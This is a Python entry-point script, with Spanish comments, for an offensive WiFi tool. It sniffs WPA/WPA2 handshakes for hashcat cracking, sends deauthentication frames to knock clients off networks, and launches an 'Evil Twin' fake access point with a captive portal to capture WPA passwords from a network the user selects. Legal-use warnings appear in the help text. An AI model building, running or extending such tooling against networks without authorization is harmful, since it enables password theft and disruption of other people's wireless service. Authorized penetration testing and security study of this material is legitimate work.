"""
Punto de entrada de la aplicación: parsea argumentos, arranca hilos y sniff.
"""

import argparse
import os
import signal
import sys
import threading
import time
from pathlib import Path

from scapy.all import sniff

from .capture import HandshakeCapture
from .display import TerminalDisplay
from .eviltwin import EvilTwinAP
from .interface import InterfaceManager
from .saver import HandshakeSaver


def _check_root() -> None:
    if os.geteuid() != 0:
        print("[-] Requiere root: sudo python3 wifi_scanner.py -i wlan0")
        sys.exit(1)


def _build_parser() -> argparse.ArgumentParser:
    return argparse.ArgumentParser(
        description="Escanea redes WiFi y captura handshakes WPA/WPA2 en formato hc22000.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Ejemplos:\n"
            "  sudo python3 wifi_scanner.py -i wlan0\n"
            "  sudo python3 wifi_scanner.py -i wlan0 -o /tmp/capturas --deauth\n"
            "  sudo python3 wifi_scanner.py -i wlan0 --eviltwin\n"
            "  sudo python3 wifi_scanner.py -i wlan0 --eviltwin --scan-time 30\n\n"
            "hashcat (tras capturar):\n"
            "  hashcat -m 22000 capturas/MiRed_*.hc22000 wordlist.txt\n\n"
            "AVISO: --deauth y --eviltwin solo deben usarse en redes propias o con "
            "autorización escrita y explícita. El uso no autorizado es ilegal."
        ),
    )


def main() -> None:
    parser = _build_parser()
    parser.add_argument("-i", "--interface", required=True, metavar="IFACE",
                        help="Interfaz WiFi (ej: wlan0)")
    parser.add_argument("-o", "--output", default="capturas", metavar="DIR",
                        help="Directorio de salida para .hc22000 y .pcap (def: capturas/)")
    parser.add_argument("--deauth", action="store_true",
                        help="Enviar frames deauth para forzar reconexión (solo redes autorizadas)")
    parser.add_argument("--no-hop", dest="hop", action="store_false", default=True,
                        help="Desactiva el salto de canal (fija el canal actual)")
    parser.add_argument("--eviltwin", action="store_true",
                        help="Modo Evil Twin: escanea redes, elige un objetivo y levanta un AP "
                             "falso con portal cautivo para capturar contraseñas WPA. "
                             "Solo para redes propias o con autorización explícita.")
    parser.add_argument("--scan-time", type=int, default=20, metavar="SEC",
                        help="Segundos de escaneo previo al Evil Twin (def: 20)")

    args = parser.parse_args()
    _check_root()

    output_dir = Path(args.output)
    iface_mgr  = InterfaceManager(args.interface)
    display    = TerminalDisplay(output_dir)
    saver      = HandshakeSaver(output_dir)
    capture    = HandshakeCapture(saver, display)

    if not iface_mgr.set_monitor_mode():
        sys.exit(1)

    hop_stop    = threading.Event()
    deauth_stop = threading.Event()
    stop_sniff  = threading.Event()

    def on_exit(sig, frame):
        hop_stop.set()
        deauth_stop.set()
        stop_sniff.set()
        iface_mgr.restore_managed_mode()
        total = sum(1 for h in capture.handshakes.values() if h.saved)
        print(f"\n[+] Handshakes guardados: {total}  →  {output_dir}/")
        sys.exit(0)

    signal.signal(signal.SIGINT,  on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    if args.hop:
        threading.Thread(
            target=iface_mgr.channel_hopper, args=(hop_stop,), daemon=True
        ).start()
        print("[*] Channel hopping activado (500 ms/canal).")

    if args.deauth:
        print("[!] Deauth activado — asegúrate de tener autorización.")

        def _deauth_loop() -> None:
            while not deauth_stop.is_set():
                deauth_stop.wait(30)
                if deauth_stop.is_set():
                    break
                for bssid, info in list(capture.networks.items()):
                    hs = capture.handshakes.get(bssid)
                    if (hs is None or not hs.saved) and "WPA" in info.encryption:
                        capture.send_deauth(args.interface, bssid)

        threading.Thread(target=_deauth_loop, daemon=True).start()

    display.render(capture.networks, capture.handshakes, capture.eapol_sessions)
    print(f"[*] Escaneando en {args.interface}...\n")

    if args.eviltwin:
        # Escanear durante scan_time segundos para descubrir redes cercanas
        threading.Timer(args.scan_time, stop_sniff.set).start()
        print(f"[*] Modo Evil Twin: escaneando {args.scan_time} s para detectar objetivos...\n")

    sniff(
        iface=args.interface,
        prn=capture.packet_handler,
        store=False,
        stop_filter=lambda _: stop_sniff.is_set(),
    )

    if args.eviltwin:
        _run_eviltwin(args, capture, iface_mgr, hop_stop, deauth_stop, output_dir)


def _run_eviltwin(
    args,
    capture: "HandshakeCapture",
    iface_mgr: "InterfaceManager",
    hop_stop: threading.Event,
    deauth_stop: threading.Event,
    output_dir: Path,
) -> None:
    """Presenta el menú de selección de objetivo y lanza el EvilTwinAP."""
    hop_stop.set()
    deauth_stop.set()

    networks = capture.networks
    if not networks:
        print("[-] No se detectaron redes. Aumenta --scan-time o acércate al objetivo.")
        return

    # Mostrar tabla de redes detectadas
    entries = list(networks.items())
    print("\n" + "─" * 72)
    print(f"  {'#':>3}  {'SSID':<28}  {'BSSID':<17}  {'CH':>3}  {'ENC'}")
    print("─" * 72)
    for idx, (bssid, info) in enumerate(entries, start=1):
        print(
            f"  {idx:>3}  {info.ssid[:28]:<28}  {bssid:<17}  "
            f"{info.channel:>3}  {info.encryption}"
        )
    print("─" * 72)

    # Selección del objetivo
    while True:
        try:
            raw = input("\n[?] Selecciona el número del objetivo (0 = cancelar): ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Cancelado.")
            iface_mgr.restore_managed_mode()
            return

        if raw == "0":
            print("[!] Cancelado.")
            iface_mgr.restore_managed_mode()
            return

        if raw.isdigit() and 1 <= int(raw) <= len(entries):
            target_bssid, target_info = entries[int(raw) - 1]
            break

        print(f"[-] Entrada inválida. Introduce un número entre 1 y {len(entries)}.")

    print(
        f"\n[+] Objetivo seleccionado: '{target_info.ssid}' "
        f"({target_bssid}, canal {target_info.channel})"
    )

    et = EvilTwinAP(
        iface=args.interface,
        ssid=target_info.ssid,
        bssid=target_bssid,
        channel=target_info.channel,
        output_dir=output_dir,
    )

    et_stop = threading.Event()

    def _on_et_exit(sig, frame):
        et_stop.set()

    import signal as _signal
    _signal.signal(_signal.SIGINT,  _on_et_exit)
    _signal.signal(_signal.SIGTERM, _on_et_exit)

    try:
        et.start(et_stop)
    finally:
        et.stop()
